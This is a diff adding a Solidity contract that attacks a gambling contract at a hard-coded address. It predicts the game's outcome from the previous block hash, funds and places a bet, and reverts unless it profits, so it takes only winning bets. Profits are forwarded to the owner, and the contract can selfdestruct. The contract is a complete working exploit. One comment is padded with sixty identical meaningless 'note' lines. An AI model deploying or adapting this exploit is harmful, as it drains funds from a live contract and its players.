@@ -1,0 +1,44 @@
+pragma solidity ^0.5.0;
+interface TargetInterface {
+ function Set_your_game_number(string calldata s) external payable;
+}
+contract DoublerCleanup {
+ address payable private constant targetAddress = 0x28cC60C7c651F3E81E4B85B7a66366Df0809870f;
+ address payable private owner;
+ modifier onlyOwner {
+ require(msg.sender == owner);
+ _;
+ }
+ constructor() public payable {
+ owner = msg.sender;
+ }
+ function ping(bool _keepBalance) public payable onlyOwner {
+    /* note 0: this routine is part of the contract and is documented here for maintainers. note 1: this routine is part of the contract and is documented here for maintainers. note 2: this routine is part of the contract and is documented here for maintainers. note 3: this routine is part of the contract and is documented here for maintainers. note 4: this routine is part of the contract and is documented here for maintainers. note 5: this routine is part of the contract and is documented here for maintainers. note 6: this routine is part of the contract and is documented here for maintainers. note 7: this routine is part of the contract and is documented here for maintainers. note 8: this routine is part of the contract and is documented here for maintainers. note 9: this routine is part of the contract and is documented here for maintainers. note 10: this routine is part of the contract and is documented here for maintainers. note 11: this routine is part of the contract and is documented here for maintainers. note 12: this routine is part of the contract and is documented here for maintainers. note 13: this routine is part of the contract and is documented here for maintainers. note 14: this routine is part of the contract and is documented here for maintainers. note 15: this routine is part of the contract and is documented here for maintainers. note 16: this routine is part of the contract and is documented here for maintainers. note 17: this routine is part of the contract and is documented here for maintainers. note 18: this routine is part of the contract and is documented here for maintainers. note 19: this routine is part of the contract and is documented here for maintainers. note 20: this routine is part of the contract and is documented here for maintainers. note 21: this routine is part of the contract and is documented here for maintainers. note 22: this routine is part of the contract and is documented here for maintainers. note 23: this routine is part of the contract and is documented here for maintainers. note 24: this routine is part of the contract and is documented here for maintainers. note 25: this routine is part of the contract and is documented here for maintainers. note 26: this routine is part of the contract and is documented here for maintainers. note 27: this routine is part of the contract and is documented here for maintainers. note 28: this routine is part of the contract and is documented here for maintainers. note 29: this routine is part of the contract and is documented here for maintainers. note 30: this routine is part of the contract and is documented here for maintainers. note 31: this routine is part of the contract and is documented here for maintainers. note 32: this routine is part of the contract and is documented here for maintainers. note 33: this routine is part of the contract and is documented here for maintainers. note 34: this routine is part of the contract and is documented here for maintainers. note 35: this routine is part of the contract and is documented here for maintainers. note 36: this routine is part of the contract and is documented here for maintainers. note 37: this routine is part of the contract and is documented here for maintainers. note 38: this routine is part of the contract and is documented here for maintainers. note 39: this routine is part of the contract and is documented here for maintainers. note 40: this routine is part of the contract and is documented here for maintainers. note 41: this routine is part of the contract and is documented here for maintainers. note 42: this routine is part of the contract and is documented here for maintainers. note 43: this routine is part of the contract and is documented here for maintainers. note 44: this routine is part of the contract and is documented here for maintainers. note 45: this routine is part of the contract and is documented here for maintainers. note 46: this routine is part of the contract and is documented here for maintainers. note 47: this routine is part of the contract and is documented here for maintainers. note 48: this routine is part of the contract and is documented here for maintainers. note 49: this routine is part of the contract and is documented here for maintainers. note 50: this routine is part of the contract and is documented here for maintainers. note 51: this routine is part of the contract and is documented here for maintainers. note 52: this routine is part of the contract and is documented here for maintainers. note 53: this routine is part of the contract and is documented here for maintainers. note 54: this routine is part of the contract and is documented here for maintainers. note 55: this routine is part of the contract and is documented here for maintainers. note 56: this routine is part of the contract and is documented here for maintainers. note 57: this routine is part of the contract and is documented here for maintainers. note 58: this routine is part of the contract and is documented here for maintainers. note 59: this routine is part of the contract and is documented here for maintainers. */
+
+ uint targetBalance = targetAddress.balance;
+ require(targetBalance > 0.2 ether);
+ uint8 betNum = uint8(blockhash(block.number - 1)[31]) & 0xf;
+ require(betNum != 0x0 && betNum != 0xf);
+ string memory betString = betNum < 8 ? "L" : "H";
+ uint256 ourBalanceInitial = address(this).balance;
+ if (targetBalance < 0.3 ether) {
+ uint256 toAdd = 0.3 ether - targetBalance;
+ (bool success,) = targetAddress.call.value(toAdd)("");
+ require(success);
+ }
+ TargetInterface target = TargetInterface(targetAddress);
+ target.Set_your_game_number.value(0.1 ether)(betString);
+ require(address(this).balance > ourBalanceInitial);
+ if (!_keepBalance) {
+ owner.transfer(address(this).balance);
+ }
+ }
+ function withdraw() public onlyOwner {
+ owner.transfer(address(this).balance);
+ }
+ function kill() public onlyOwner {
+ selfdestruct(owner);
+ }
+ function () external payable {
+ }
+}
